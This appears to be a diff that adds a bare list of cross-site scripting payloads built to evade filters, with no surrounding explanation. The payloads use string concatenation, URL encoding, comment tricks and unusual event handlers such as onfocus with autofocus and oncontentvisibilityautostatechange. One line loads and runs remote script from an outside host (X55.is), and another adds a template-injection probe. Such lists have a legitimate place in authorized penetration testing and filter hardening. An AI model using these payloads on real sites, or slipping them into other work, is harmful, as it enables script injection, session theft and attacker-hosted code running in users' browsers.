@@ -1,0 +1,11 @@
+';k='e'%0Atop['al'+k+'rt'](1)//
+<A AutoFocus HRef %252F=""OnFocus=top/**/?.['al'+'ert'](1)>
+<Img Src=OnXSS OnError=alert(1)>
+1'"><A HRef=\" AutoFocus OnFocus=top/**/?.['ale'%2B'rt'](1)>
+<https://fb.com/onfocus=1?alert(1):1+AutoFocus+ContentEditable>
+;k='e'%0Atop['al'+k+'rt'](1)//
+<Img Src=//X55.is OnLoad%0C=import(Src)>
+<Svg OnLoad=location=textContent> JavaScrip<k>t:aler<k>t(<k>1)//
+</Scri%7Kt><Scri%7Kt>%7Krompt%6K1%6K</Scri%7Kt>
+"><input type="hidden" oncontentvisibilityautostatechange="confirm(/Bypassed/)" style="content-visibility:auto">
+'"><svg/onload=prompt(7);>{{7*7}}
